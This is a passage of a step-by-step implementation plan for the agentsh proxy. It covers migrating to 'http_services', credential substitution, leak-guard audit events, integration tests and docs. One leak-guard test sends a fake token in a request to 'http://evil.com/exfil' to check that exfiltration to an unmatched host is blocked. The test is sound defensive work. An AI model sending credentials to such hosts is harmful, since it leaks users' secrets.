		// p.SetMatcher(matcher)
```

Remove the `"github.com/agentsh/agentsh/internal/proxy/services"` import.

Also remove `BuildServiceEnvVars` and `CheckEnvCollisions` calls if they reference the old `resolved.EnvVars` (lines 133-146), since env vars are now handled by `Proxy.EnvVars()`.

- [ ] **Step 2: Update `internal/api/app.go`**

At line 470-488, change:

```go
	var policyServices []policy.ServiceYAML
	var envInject map[string]string
	if pol != nil {
		if p := pol.Policy(); p != nil {
			providers = p.Providers
			policyServices = p.Services
		}
		envInject = mergeEnvInject(a.cfg, pol)
	}

	proxyURL, closeFn, err := session.StartLLMProxy(
		s, a.cfg.Proxy, a.cfg.DLP, a.cfg.LLMStorage, a.cfg.Sandbox.MCP,
		storagePath, slog.Default(),
		providers, policyServices, envInject,
	)
```

To:

```go
	var httpServices []policy.HTTPService
	var envInject map[string]string
	if pol != nil {
		if p := pol.Policy(); p != nil {
			providers = p.Providers
			httpServices = p.HTTPServices
		}
		envInject = mergeEnvInject(a.cfg, pol)
	}

	proxyURL, closeFn, err := session.StartLLMProxy(
		s, a.cfg.Proxy, a.cfg.DLP, a.cfg.LLMStorage, a.cfg.Sandbox.MCP,
		storagePath, slog.Default(),
		providers, httpServices, envInject,
	)
```

- [ ] **Step 3: Update `internal/policy/model.go`**

Replace the `Services` field and comment (lines 46-54) with:

```go
	// External secrets: provider definitions.
	Providers map[string]yaml.Node `yaml:"providers,omitempty"`

	// Services is a migration tripwire. The old "services:" key has been
	// replaced by "http_services:". If this field is non-zero after YAML
	// parsing, Validate emits a clear migration error.
	Services yaml.Node `yaml:"services,omitempty"`

	// HTTP services: unified path/verb filtering + credential substitution.
	HTTPServices []HTTPService `yaml:"http_services,omitempty"`
```

In the `Validate()` method, replace the `ValidateSecrets` call (line 518-525):

```go
	// Reject old services: key with migration guidance.
	if p.Services.Kind != 0 {
		return fmt.Errorf("the 'services:' key has been replaced by 'http_services:' — move secret, inject, and scrub_response fields into your http_services entries")
	}

	if err := ValidateHTTPServicesWithProviders(p.HTTPServices, p.Providers); err != nil {
		return err
	}
```

Remove the now-unused call to `ValidateHTTPServices(p.HTTPServices)` that follows (since `ValidateHTTPServicesWithProviders` calls it internally).

- [ ] **Step 4: Write a test for the old `services:` key migration tripwire**

Add to `internal/policy/http_service_test.go`:

```go
func TestPolicyValidate_OldServicesKeyRejected(t *testing.T) {
	input := `
version: 1
services:
  - name: github
    match:
      hosts: ["api.github.com"]
    secret:
      ref: keyring://agentsh/github_token
`
	var p policy.Policy
	if err := yaml.Unmarshal([]byte(input), &p); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	err := p.Validate()
	if err == nil {
		t.Fatal("expected error for old services: key")
	}
	if !strings.Contains(err.Error(), "'services:' key has been replaced") {
		t.Errorf("want migration error, got: %v", err)
	}
}
```

- [ ] **Step 5: Verify the build compiles**

Run: `go build ./...`
Expected: SUCCESS (no compile errors).

- [ ] **Step 6: Run the tripwire test and all policy tests**

Run: `go test ./internal/policy/ -run TestPolicyValidate_OldServicesKeyRejected -v -count=1`
Expected: PASS

Run: `go test ./internal/policy/... ./internal/session/... ./internal/api/... -count=1`
Expected: PASS (tests that reference `policy.ServiceYAML` or `ValidateSecrets` will fail — these are deleted in the next task).

- [ ] **Step 7: Commit**

```bash
git add internal/session/llmproxy.go internal/api/app.go internal/policy/model.go internal/policy/http_service_test.go
git commit -m "refactor: swap bootstrap path from services: to http_services:"
```

---

### Task 6: Delete Old Code

**Files:**
- Delete: `internal/policy/secrets.go`
- Delete: `internal/policy/secrets_test.go`
- Delete: `internal/proxy/services/matcher.go`
- Delete: `internal/proxy/services/matcher_test.go`
- Modify: `internal/proxy/proxy.go` (remove `matcher` field, `SetMatcher`)

- [ ] **Step 1: Delete the files**

```bash
rm internal/policy/secrets.go internal/policy/secrets_test.go
rm internal/proxy/services/matcher.go internal/proxy/services/matcher_test.go
```

- [ ] **Step 2: Remove matcher from proxy**

In `internal/proxy/proxy.go`, remove:
- The `matcher *services.Matcher` field from the `Proxy` struct (line 78)
- The `SetMatcher` method (lines 209-215)
- The `import "github.com/agentsh/agentsh/internal/proxy/services"` line
- Any Host-header matching code in `ServeHTTP` that uses the matcher (lines 419-423) — set `serviceName` from `declaredService()` path dispatch only, which already happens earlier

- [ ] **Step 3: Verify build compiles**

Run: `go build ./...`
Expected: SUCCESS. If there are compile errors from other files referencing the deleted types, fix the remaining references.

- [ ] **Step 4: Run all tests**

Run: `go test ./... -count=1`
Expected: PASS — with old tests deleted, no remaining references to `ServiceYAML`, `ValidateSecrets`, or `services.Matcher`.

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "refactor: remove old services: types, Matcher, and ValidateSecrets"
```

---

### Task 7: Cross-Service Audit Event

**Files:**
- Modify: `internal/proxy/credshook.go:105-166`
- Modify: `internal/proxy/credshook_test.go`

- [ ] **Step 1: Write the failing tests**

Add to `internal/proxy/credshook_test.go`:

```go
func TestLeakGuardHook_CrossServiceUse_LogsDifferentEvent(t *testing.T) {
	table := credsub.New()
	// Service A: github
	fakeA := []byte("ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
	realA := []byte("ghp_RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR")
	if err := table.Add("github", fakeA, realA); err != nil {
		t.Fatal(err)
	}

	var buf bytes.Buffer
	logger := slog.New(slog.NewJSONHandler(&buf, nil))
	hook := proxy.NewLeakGuardHook(table, logger)

	// Simulate request to service B ("stripe") containing service A's fake.
	body := []byte(`{"token":"` + string(fakeA) + `"}`)
	req := httptest.NewRequest("POST", "http://proxy/svc/stripe/v1/charges", bytes.NewReader(body))
	ctx := &proxy.RequestContext{
		SessionID:   "sess-1",
		RequestID:   "req-1",
		ServiceName: "stripe", // routed to stripe, not github
	}

	err := hook.PreHook(req, ctx)
	if err == nil {
		t.Fatal("expected error for cross-service credential use")
	}
	var abort *proxy.HookAbortError
	if !errors.As(err, &abort) || abort.StatusCode != 403 {
		t.Fatalf("want 403 HookAbortError, got %v", err)
	}

	logOutput := buf.String()
	if !strings.Contains(logOutput, "secret_cross_service_use") {
		t.Errorf("want secret_cross_service_use in log, got:\n%s", logOutput)
	}
	if !strings.Contains(logOutput, `"source_service":"github"`) {
		t.Errorf("want source_service=github in log, got:\n%s", logOutput)
	}
	if !strings.Contains(logOutput, `"target_service":"stripe"`) {
		t.Errorf("want target_service=stripe in log, got:\n%s", logOutput)
	}
}

func TestLeakGuardHook_UnmatchedHost_LogsLeakBlocked(t *testing.T) {
	table := credsub.New()
	fake := []byte("ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
	real := []byte("ghp_RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR")
	if err := table.Add("github", fake, real); err != nil {
		t.Fatal(err)
	}

	var buf bytes.Buffer
	logger := slog.New(slog.NewJSONHandler(&buf, nil))
	hook := proxy.NewLeakGuardHook(table, logger)

	body := []byte(`{"token":"` + string(fake) + `"}`)
	req := httptest.NewRequest("POST", "http://evil.com/exfil", bytes.NewReader(body))
	ctx := &proxy.RequestContext{
		SessionID:   "sess-1",
		RequestID:   "req-1",
		ServiceName: "", // unmatched host
	}

	err := hook.PreHook(req, ctx)
	if err == nil {
		t.Fatal("expected error for leak to unmatched host")
	}

	logOutput := buf.String()
	if !strings.Contains(logOutput, "secret_leak_blocked") {
		t.Errorf("want secret_leak_blocked in log, got:\n%s", logOutput)
	}
	// Should NOT contain cross-service event.
	if strings.Contains(logOutput, "secret_cross_service_use") {
		t.Error("unmatched host should log secret_leak_blocked, not secret_cross_service_use")
	}
}
```

- [ ] **Step 2: Run tests to verify the cross-service test fails**

Run: `go test ./internal/proxy/ -run "TestLeakGuardHook_(CrossService|UnmatchedHost_Logs)" -v -count=1`
Expected: `TestLeakGuardHook_CrossServiceUse_LogsDifferentEvent` FAILS — currently logs `secret_leak_blocked` for both cases.

- [ ] **Step 3: Add `logCrossService` and branch in `PreHook`**

In `internal/proxy/credshook.go`, update the `PreHook` method. In each scan block (body, query, headers, path), change the block that handles `serviceName != ctx.ServiceName`:

Replace the pattern:

```go
			if serviceName != ctx.ServiceName {
				h.logLeak(ctx, serviceName, r.Host)
				return &HookAbortError{StatusCode: 403, Message: "credential leak blocked"}
			}
```

With:

```go
			if serviceName != ctx.ServiceName {
				if ctx.ServiceName == "" {
					h.logLeak(ctx, serviceName, r.Host)
				} else {
					h.logCrossService(ctx, serviceName, ctx.ServiceName, r.Host)
				}
				return &HookAbortError{StatusCode: 403, Message: "credential leak blocked"}
			}
```

Apply this change in all four scan blocks (body, query, headers, path).

Add the new method after `logLeak`:

```go
func (h *LeakGuardHook) logCrossService(ctx *RequestContext, sourceService, targetService, requestHost string) {
	h.logger.Warn("secret_cross_service_use",
		"session_id", ctx.SessionID,
		"request_id", ctx.RequestID,
		"source_service", sourceService,
		"target_service", targetService,
		"request_host", requestHost,
	)
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/proxy/ -run "TestLeakGuardHook_(CrossService|UnmatchedHost_Logs)" -v -count=1`
Expected: PASS

- [ ] **Step 5: Run all proxy tests for regressions**

Run: `go test ./internal/proxy/... -count=1`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add internal/proxy/credshook.go internal/proxy/credshook_test.go
git commit -m "feat(proxy): differentiate secret_cross_service_use audit event"
```

---

### Task 8: Integration Tests — Proxy Credential Substitution and Edge Cases

This task adds the integration tests that verify credential substitution works end-to-end through the proxy's `ServeHTTP` path, plus edge cases not covered by earlier unit tests. These tests go in `internal/proxy/declared_service_test.go` alongside the existing declared-service tests.

**Files:**
- Modify: `internal/proxy/declared_service_test.go`

- [ ] **Step 1: Write the credential substitution end-to-end test**

Add to `internal/proxy/declared_service_test.go`:

```go
func TestServeDeclaredService_CredentialSubstitution_EndToEnd(t *testing.T) {
	// Upstream records what it receives and echoes back a response
	// containing the real credential (to verify response scrubbing).
	var upstreamAuthHeader string
	var upstreamBody []byte
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		upstreamAuthHeader = r.Header.Get("Authorization")
		upstreamBody, _ = io.ReadAll(r.Body)
		w.Header().Set("Content-Type", "application/json")
		// Response deliberately contains the real credential.
		fmt.Fprintf(w, `{"echoed":"ghp_REAL1234567890abcdef"}`)
	}))
	defer upstream.Close()

	p := newTestProxyWithHTTPService(t, upstream.URL, []policy.HTTPServiceRule{{
		Name: "allow-repos", Methods: []string{"POST"}, Paths: []string{"/repos/**"}, Decision: "allow",
	}})

	// Set up credential table and hooks.
	tbl := credsub.New()
	if err := tbl.Add("github",
		[]byte("ghp_FAKE1234567890abcdef"),
		[]byte("ghp_REAL1234567890abcdef"),
	); err != nil {
		t.Fatal(err)
	}
	scrubServices := map[string]bool{"github": true}
	p.HookRegistry().Register("", NewLeakGuardHook(tbl, slog.Default()))
	p.HookRegistry().Register("", NewCredsSubHook(tbl, scrubServices))
	p.HookRegistry().Register("github", NewHeaderInjectionHook(
		"github", "Authorization", "Bearer {{secret}}", tbl))

	// Client sends fake credential in body.
	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
	req := httptest.NewRequest(http.MethodPost,
		"http://127.0.0.1/svc/github/repos/owner/repo/issues", bytes.NewReader(body))
	w := httptest.NewRecorder()
	p.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	// Upstream should have received REAL credential in header.
	if upstreamAuthHeader != "Bearer ghp_REAL1234567890abcdef" {
		t.Errorf("upstream Auth = %q, want real credential injected", upstreamAuthHeader)
	}
	// Upstream body should have REAL credential (substituted from fake).
	if !bytes.Contains(upstreamBody, []byte("ghp_REAL1234567890abcdef")) {
		t.Errorf("upstream body = %q, want real credential in body", upstreamBody)
	}
	// Client response should have FAKE credential (scrubbed from real).
	respBody := w.Body.String()
	if strings.Contains(respBody, "ghp_REAL1234567890abcdef") {
		t.Error("response body contains real credential — scrubbing failed")
	}
	if !strings.Contains(respBody, "ghp_FAKE1234567890abcdef") {
		t.Error("response body should contain fake credential (scrubbed)")
	}
}
```

- [ ] **Step 2: Write the deny-with-credentials test (upstream not contacted)**

```go
func TestServeDeclaredService_CredentialsDeny_UpstreamNotContacted(t *testing.T) {
	upstreamCalled := false
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		upstreamCalled = true
		w.WriteHeader(200)
	}))
	defer upstream.Close()

	p := newTestProxyWithHTTPService(t, upstream.URL, []policy.HTTPServiceRule{
		{Name: "read", Methods: []string{"GET"}, Paths: []string{"/repos/**"}, Decision: "allow"},
	})
	// Default is "deny" from the helper, so DELETE won't match any rule → denied.
	tbl := credsub.New()
	if err := tbl.Add("github",
		[]byte("ghp_FAKE1234567890abcdef"),
		[]byte("ghp_REAL1234567890abcdef"),
	); err != nil {
		t.Fatal(err)
	}
	p.HookRegistry().Register("", NewLeakGuardHook(tbl, slog.Default()))
	p.HookRegistry().Register("", NewCredsSubHook(tbl, nil))
	p.HookRegistry().Register("github", NewHeaderInjectionHook(
		"github", "Authorization", "Bearer {{secret}}", tbl))

	req := httptest.NewRequest(http.MethodDelete,
		"http://127.0.0.1/svc/github/repos/a/b", nil)
	w := httptest.NewRecorder()
	p.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403", w.Code)
	}
	if upstreamCalled {
		t.Error("upstream should NOT have been contacted for denied request")
	}
}
```

- [ ] **Step 3: Write the credentials-only service test (all requests allowed)**

```go
func TestServeDeclaredService_CredentialsOnly_AllRequestsAllowed(t *testing.T) {
	var upstreamApiKey string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		upstreamApiKey = r.Header.Get("X-Api-Key")
		w.WriteHeader(200)
	}))
	defer upstream.Close()

	// Build proxy manually — credentials-only service (no rules, no explicit
	// default). After Task 3, empty Default + no Rules → allow.
	cfg := Config{SessionID: "test-session"}
	p, err := New(cfg, "", nil)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	svcs := []policy.HTTPService{{
		Name: "anthropic", Upstream: upstream.URL,
		// No Default, no Rules → credentials-only.
	}}
	if err := policy.ValidateHTTPServices(svcs); err != nil {
		t.Fatalf("validate: %v", err)
	}
	pol := &policy.Policy{HTTPServices: svcs}
	eng, err := policy.NewEngine(pol, true, true)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	p.SetPolicyEngine(eng)
	p.SetHTTPServices(svcs)

	tbl := credsub.New()
	if err := tbl.Add("anthropic",
		[]byte("sk-ant-FAKE567890abcdef12"),
		[]byte("sk-ant-REAL567890abcdef12"),
	); err != nil {
		t.Fatal(err)
	}
	p.HookRegistry().Register("", NewCredsSubHook(tbl, nil))
	p.HookRegistry().Register("anthropic", NewHeaderInjectionHook(
		"anthropic", "X-Api-Key", "{{secret}}", tbl))

	// Any method/path should be allowed.
	req := httptest.NewRequest(http.MethodPost,
		"http://127.0.0.1/svc/anthropic/v1/messages", nil)
	w := httptest.NewRecorder()
	p.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (credentials-only allows all)", w.Code)
	}
	if upstreamApiKey != "sk-ant-REAL567890abcdef12" {
		t.Errorf("upstream X-Api-Key = %q, want real credential", upstreamApiKey)
	}
}
```

- [ ] **Step 4: Write the `scrub_response: false` functional test**

```go
func TestServeDeclaredService_ScrubResponseFalse_RealsNotScrubbed(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		// Response contains real credential.
		fmt.Fprintf(w, `{"key":"ghp_REAL1234567890abcdef"}`)
	}))
	defer upstream.Close()

	p := newTestProxyWithHTTPService(t, upstream.URL, []policy.HTTPServiceRule{
		{Name: "allow-all", Paths: []string{"/**"}, Decision: "allow"},
	})

	tbl := credsub.New()
	if err := tbl.Add("github",
		[]byte("ghp_FAKE1234567890abcdef"),
		[]byte("ghp_REAL1234567890abcdef"),
	); err != nil {
		t.Fatal(err)
	}
	// scrub_response=false: "github" is NOT in the scrub map.
	scrubServices := map[string]bool{} // empty = no services scrubbed
	p.HookRegistry().Register("", NewCredsSubHook(tbl, scrubServices))

	req := httptest.NewRequest(http.MethodGet,
		"http://127.0.0.1/svc/github/repos/owner/repo", nil)
	w := httptest.NewRecorder()
	p.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
	// Real credential should remain in response (scrubbing disabled).
	respBody := w.Body.String()
	if !strings.Contains(respBody, "ghp_REAL1234567890abcdef") {
		t.Error("response should contain real credential (scrub disabled)")
	}
}
```

- [ ] **Step 5: Write the emergency lockdown test (credentials-only + explicit deny)**

```go
func TestServeDeclaredService_CredentialsOnly_ExplicitDeny_BlocksAll(t *testing.T) {
	upstreamCalled := false
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		upstreamCalled = true
		w.WriteHeader(200)
	}))
	defer upstream.Close()

	// Credentials-only service with explicit default: deny (emergency lockdown).
	cfg := Config{SessionID: "test-session"}
	p, err := New(cfg, "", nil)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	svcs := []policy.HTTPService{{
		Name: "locked", Upstream: upstream.URL, Default: "deny",
		// No Rules — the explicit deny blocks everything.
	}}
	if err := policy.ValidateHTTPServices(svcs); err != nil {
		t.Fatalf("validate: %v", err)
	}
	pol := &policy.Policy{HTTPServices: svcs}
	eng, err := policy.NewEngine(pol, true, true)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	p.SetPolicyEngine(eng)
	p.SetHTTPServices(svcs)

	req := httptest.NewRequest(http.MethodGet,
		"http://127.0.0.1/svc/locked/anything", nil)
	w := httptest.NewRecorder()
	p.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403 (emergency lockdown)", w.Code)
	}
	if upstreamCalled {
		t.Error("upstream should NOT have been contacted during lockdown")
	}
}
```

- [ ] **Step 6: Write the cross-service leak detection through proxy test**

```go
func TestServeDeclaredService_CrossServiceLeak_BlockedWith403(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Error("upstream should not have been contacted")
		w.WriteHeader(200)
	}))
	defer upstream.Close()

	// Two declared services.
	cfg := Config{SessionID: "test-session"}
	p, err := New(cfg, "", nil)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	svcs := []policy.HTTPService{
		{Name: "github", Upstream: upstream.URL, Default: "allow"},
		{Name: "stripe", Upstream: "https://api.stripe.com", Default: "allow"},
	}
	if err := policy.ValidateHTTPServices(svcs); err != nil {
		t.Fatalf("validate: %v", err)
	}
	pol := &policy.Policy{HTTPServices: svcs}
	eng, err := policy.NewEngine(pol, true, true)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	p.SetPolicyEngine(eng)
	p.SetHTTPServices(svcs)

	// Credential table with fakes for both services.
	tbl := credsub.New()
	if err := tbl.Add("github",
		[]byte("ghp_FAKE1234567890abcdef"),
		[]byte("ghp_REAL1234567890abcdef"),
	); err != nil {
		t.Fatal(err)
	}
	if err := tbl.Add("stripe",
		[]byte("sk_live_FAKE567890abcdef12"),
		[]byte("sk_live_REAL567890abcdef12"),
	); err != nil {
		t.Fatal(err)
	}
	p.HookRegistry().Register("", NewLeakGuardHook(tbl, slog.Default()))
	p.HookRegistry().Register("", NewCredsSubHook(tbl, nil))

	// Send github's fake credential to stripe's service → cross-service leak.
	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
	req := httptest.NewRequest(http.MethodPost,
		"http://127.0.0.1/svc/stripe/v1/charges", bytes.NewReader(body))
	w := httptest.NewRecorder()
	p.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403 (cross-service leak)", w.Code)
	}
	if !strings.Contains(w.Body.String(), "credential leak blocked") {
		t.Errorf("body = %q, want 'credential leak blocked'", w.Body.String())
	}
}
```

- [ ] **Step 7: Write the filtering-only test (no hooks, no credential injection)**

```go
func TestServeDeclaredService_FilteringOnly_NoCredentialHooks(t *testing.T) {
	var upstreamAuthHeader string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		upstreamAuthHeader = r.Header.Get("Authorization")
		w.WriteHeader(200)
	}))
	defer upstream.Close()

	// Filtering-only service — no credential hooks registered.
	p := newTestProxyWithHTTPService(t, upstream.URL, []policy.HTTPServiceRule{
		{Name: "allow-read", Methods: []string{"GET"}, Paths: []string{"/**"}, Decision: "allow"},
	})
	// Deliberately do NOT register any credential hooks.

	req := httptest.NewRequest(http.MethodGet,
		"http://127.0.0.1/svc/github/repos/owner/repo", nil)
	req.Header.Set("Authorization", "Bearer user-provided-token")
	w := httptest.NewRecorder()
	p.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
	// Upstream should receive the header as-is (no substitution).
	if upstreamAuthHeader != "Bearer user-provided-token" {
		t.Errorf("upstream Auth = %q, want original token (no hook)", upstreamAuthHeader)
	}
}
```

- [ ] **Step 8: Write the matcher removal regression test**

```go
func TestServeHTTP_HostHeaderOnly_DoesNotRouteToDeclaredService(t *testing.T) {
	// After matcher removal, a request with Host: api.github.com but no
	// /svc/github/ prefix should NOT route to the declared service. It
	// should fall through to the LLM dialect detection path.
	p := newTestProxyWithHTTPService(t, "https://api.github.com", []policy.HTTPServiceRule{
		{Name: "allow-all", Paths: []string{"/**"}, Decision: "allow"},
	})

	// Request uses Host header matching the upstream, but the URL path
	// does NOT start with /svc/github/.
	req := httptest.NewRequest(http.MethodGet, "http://api.github.com/repos/owner/repo", nil)
	w := httptest.NewRecorder()
	p.ServeHTTP(w, req)

	// Should NOT be 200 from the declared service — it should go to the
	// LLM path (which will likely fail with 400/404 since it's not a valid
	// LLM request). The key assertion is that it's NOT routed as a
	// declared service (which would return 200 with the upstream response).
	// If a Matcher were still active, it would route based on Host header.
	if w.Code == http.StatusOK {
		t.Error("Host-only request should NOT route to declared service (matcher removed)")
	}
}
```

- [ ] **Step 9: Run all tests**

Run: `go test ./internal/proxy/... -run "TestServeDeclaredService_(CredentialSub|CredentialsDeny|CredentialsOnly|ScrubResponse|ExplicitDeny|CrossService|FilteringOnly)|TestServeHTTP_HostHeaderOnly" -v -count=1`
Expected: PASS

- [ ] **Step 10: Run full proxy test suite for regressions**

Run: `go test ./internal/proxy/... -count=1`
Expected: PASS

- [ ] **Step 11: Commit**

```bash
git add internal/proxy/declared_service_test.go
git commit -m "test(proxy): integration tests for credential substitution through declared services"
```

---

### Task 9: Documentation

**Files:**
- Modify: `docs/cookbook/http-services.md`
- Modify: `docs/llm-proxy.md`

- [ ] **Step 1: Update `docs/cookbook/http-services.md`**

Add a new section after the "How http_services routing works" section, before the first recipe:

```markdown
## How credential substitution works

When an `http_services` entry includes a `secret:` block, agentsh performs credential
substitution so the agent never sees the real credential:

1. **At session start**, agentsh fetches the real secret from the provider declared
   in `providers:` (Vault, keyring, AWS SM, etc.).
2. **A fake credential** with the same format and length is generated using `secret.format`.
3. **The agent receives** `<NAME>_API_URL=http://127.0.0.1:PORT/svc/<name>/` and interacts
   with the gateway using the fake credential — it never sees the real one.
4. **On egress**, the gateway replaces fakes with reals in the request body, headers,
   query string, and URL path. If `inject.header` is configured, the real credential is
   injected into the specified header from scratch.
5. **On response**, the gateway replaces any reals in the response body with fakes before
   returning to the agent.
6. **Leak guard** blocks requests that carry a fake credential to the wrong service (cross-
   service use) or to an unmatched host (exfiltration attempt), returning 403.

Credential substitution composes with path/verb rules: a service can have both `secret:`
and `rules:` — the gateway evaluates rules first, then performs substitution on allowed
requests.
```

Add new recipes:

```markdown
## Recipe: route GitHub through the gateway with a Vault-backed token

Declare a Vault provider and a GitHub service with credential injection and read-only
rules:

\`\`\`yaml
providers:
  vault:
    type: vault
    address: https://vault.corp.internal
    auth:
      method: token
      token_ref: keyring://agentsh/vault_token
  keyring:
    type: keyring

http_services:
  - name: github
    upstream: https://api.github.com
    aliases: [api.github.com]
    default: deny

    secret:
      ref: vault://kv/data/github#token
      format: "ghp_{rand:36}"
    inject:
      header:
        name: Authorization
        template: "Bearer {{secret}}"

    rules:
      - name: read-issues
        methods: [GET]
        paths:
          - /repos/*/*/issues
          - /repos/*/*/issues/*
        decision: allow
\`\`\`

The agent receives `GITHUB_API_URL=http://127.0.0.1:PORT/svc/github/`. When it reads
issues, the gateway evaluates the allow rule, substitutes the fake token with the real
Vault-sourced token, and forwards to `api.github.com` over TLS. The real token never
enters the agent's address space.

## Recipe: use OS keyring for a simple API key

For a service that only needs credential injection without path filtering:

\`\`\`yaml
providers:
  keyring:
    type: keyring

http_services:
  - name: anthropic
    upstream: https://api.anthropic.com
    secret:
      ref: keyring://agentsh/anthropic_key
      format: "sk-ant-{rand:93}"
    inject:
      header:
        name: x-api-key
        template: "{{secret}}"
\`\`\`

No `rules:` or `default:` — the service allows all requests (credentials-only mode).
The gateway injects the real API key on every request and scrubs it from responses.

## Recipe: credentials and filtering combined

A service with both credential injection and per-path rules:

\`\`\`yaml
http_services:
  - name: stripe
    upstream: https://api.stripe.com
    aliases: [api.stripe.com]
    default: deny

    secret:
      ref: vault://kv/data/stripe#api_key
      format: "sk_live_{rand:48}"
    inject:
      header:
        name: Authorization
        template: "Bearer {{secret}}"

    rules:
      - name: read-customers
        methods: [GET]
        paths:
          - /v1/customers
          - /v1/customers/*
        decision: allow

      - name: create-charge-needs-approval
        methods: [POST]
        paths:
          - /v1/charges
        decision: approve
        message: "Agent wants to create a Stripe charge. Approve?"
        timeout: 2m
\`\`\`

The agent can read customers freely. Creating charges requires operator approval.
The real Stripe API key is injected on allowed requests and never visible to the agent.
```

- [ ] **Step 2: Update `docs/llm-proxy.md`**

In the "Declared HTTP Services" section, update the configuration example to include the credential fields. Add to the schema description:

```markdown
| Field | Required | Description |
|-------|----------|-------------|
| `secret.ref` | No | Secret store URI, e.g. `vault://kv/data/github#token`. Scheme must match a declared `providers:` entry. |
| `secret.format` | With `secret.ref` | Fake credential template, e.g. `ghp_{rand:36}`. Must have `{rand:N}` with N >= 24. |
| `inject.header.name` | No | Header to inject the real credential into, e.g. `Authorization`. Requires `secret`. |
| `inject.header.template` | With `inject.header.name` | Template string, must contain `{{secret}}`. E.g. `Bearer {{secret}}`. |
| `scrub_response` | No | Replace real credentials in response bodies with fakes. Defaults to `true` when `secret` is present, `false` otherwise. |
```

Add to the "When to use http_services" section:

```markdown
Use `http_services` with `secret:` when you want the gateway to manage credentials on
behalf of the agent — the agent never sees the real credential, and the gateway injects
it on allowed requests. This is the recommended pattern for any service where the agent
needs to authenticate but should not hold the credential directly.
```

- [ ] **Step 3: Commit**

```bash
git add docs/cookbook/http-services.md docs/llm-proxy.md
git commit -m "docs: credential substitution recipes and reference for unified http_services"
```

---

### Task 10: Cross-Compile Gate and Final Verification

**Files:** None (verification only)

- [ ] **Step 1: Cross-compile for Windows**

Run: `GOOS=windows go build ./...`
Expected: SUCCESS

- [ ] **Step 2: Run full test suite**

Run: `go test ./... -count=1`
Expected: PASS

- [ ] **Step 3: Verify no references to old types remain**

Run: `grep -r 'ServiceYAML\|ServiceMatchYAML\|ServiceSecretYAML\|ServiceFakeYAML\|ServiceInjectYAML\|ServiceInjectHeaderYAML\|ServiceInjectEnvYAML' internal/ --include='*.go'`
Expected: No matches in `.go` files.

Run: `grep -r 'ValidateSecrets' internal/ --include='*.go'`
Expected: No matches.

Run: `grep -r 'SetMatcher\|services\.Matcher\|services\.NewMatcher' internal/ --include='*.go'`
Expected: No matches.

- [ ] **Step 4: Commit if any cleanup was needed**

```bash
git add -A
git commit -m "chore: final cleanup after unified http_services migration"
```
